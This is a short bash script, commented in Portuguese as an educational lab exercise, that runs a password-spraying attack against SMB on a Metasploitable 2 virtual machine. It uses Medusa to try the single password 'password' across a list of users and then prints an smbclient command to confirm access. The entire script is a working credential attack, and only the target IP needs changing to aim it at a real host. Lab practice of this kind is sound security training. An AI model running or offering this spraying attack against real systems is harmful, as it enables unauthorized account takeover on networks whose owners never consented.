#!/bin/bash
# ==============================================================================
# Script de Auditoria Educacional - Password Spraying em SMB com Medusa
# Ambiente: Laboratório VirtualBox (Kali Linux -> Metasploitable 2)
# ==============================================================================

TARGET_IP="192.168.56.102" # Ajuste para o IP da sua máquina Metasploitable 2
USER_LIST="../wordlists/smb_users.txt"
PASSWORD="password"        # Senha padrão comum corporativa testada em spray

echo "=========================================================="
echo "[+] Iniciando Simulação de Password Spraying em SMB..."
echo "[+] Alvo: $TARGET_IP"
echo "[+] Usuários Alvo: $USER_LIST"
echo "[+] Senha Pulverizada (Sprayed): $PASSWORD"
echo "=========================================================="

# -h: Host alvo
# -U: Lista de usuários (enumerados previamente)
# -p: Única senha sendo pulverizada em todas as contas (Password Spraying)
# -M: Módulo smbnt (autenticação SMB)
# -f: Para na primeira combinação válida
medusa -h "$TARGET_IP" -U "$USER_LIST" -p "$PASSWORD" -M smbnt -f -v 4

echo "=========================================================="
echo "[+] Validação de Acesso com Smbclient:"
echo "    smbclient -L //$TARGET_IP/ -U msfadmin"
echo "=========================================================="
